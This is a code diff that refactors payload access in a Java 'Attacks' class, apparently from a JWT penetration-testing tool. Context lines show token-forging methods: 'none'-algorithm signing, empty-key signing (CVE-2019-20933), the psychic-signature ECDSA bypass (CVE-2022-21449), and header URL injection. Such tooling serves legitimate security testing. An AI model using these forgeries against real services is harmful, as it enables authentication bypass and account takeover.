@@ -86,7 +86,7 @@ public class Attacks {
 
         // Sign and return the new JWS
         Base64URL header = signingInfo.toBase64URL();
-        Base64URL payload = jws.getEncodedPayload();
+        Base64URL payload = jws.claims().encoded();
 
         return JWSFactory.sign(signingKey, header, payload, signingInfo);
     }
@@ -101,7 +101,7 @@ public class Attacks {
     public static JWS noneSigning(JWS jws, String algorithm){
         String decodedHeader = String.format("{\"typ\":\"JWT\",\"alg\":\"%s\"}", algorithm); //NON-NLS
         Base64URL header = Base64URL.encode(decodedHeader);
-        return jwsFromParts(header, jws.getEncodedPayload(), Base64URL.encode(new byte[0]));
+        return jwsFromParts(header, jws.claims().encoded(), Base64URL.encode(new byte[0]));
     }
 
     //  CVE-2019-20933 => https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
@@ -116,7 +116,7 @@ public class Attacks {
 
         Key key = JWKKeyFactory.from(new OctetSequenceKey.Builder(EMPTY_KEY).build());
 
-        return JWSFactory.sign(key, algorithm, headerBase64, jws.getEncodedPayload());
+        return JWSFactory.sign(key, algorithm, headerBase64, jws.claims().encoded());
     }
 
     //  CVE-2022-21449 => https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
@@ -142,7 +142,7 @@ public class Attacks {
 
         Base64URL encodedSignature = Base64URL.encode(signature);
 
-        return JWSFactory.jwsFromParts(headerBase64, jws.getEncodedPayload(), encodedSignature);
+        return JWSFactory.jwsFromParts(headerBase64, jws.claims().encoded(), encodedSignature);
     }
 
     /**
@@ -169,7 +169,7 @@ public class Attacks {
         JWSHeader jwsHeader = jwsHeaderBuilder.build();
 
         Base64URL header = jwsHeader.toBase64URL();
-        Base64URL payload = jws.getEncodedPayload();
+        Base64URL payload = jws.claims().encoded();
 
         return JWSFactory.sign(key, header, payload, jwsHeader);
     }
@@ -186,6 +186,6 @@ public class Attacks {
         headerJsonObject.put(location, url);
         Base64URL headerBase64 = Base64URL.encode(headerJsonObject.toString());
 
-        return jwsFromParts(headerBase64, jws.getEncodedPayload(), jws.getEncodedSignature());
+        return jwsFromParts(headerBase64, jws.claims().encoded(), jws.getEncodedSignature());
     }
 }
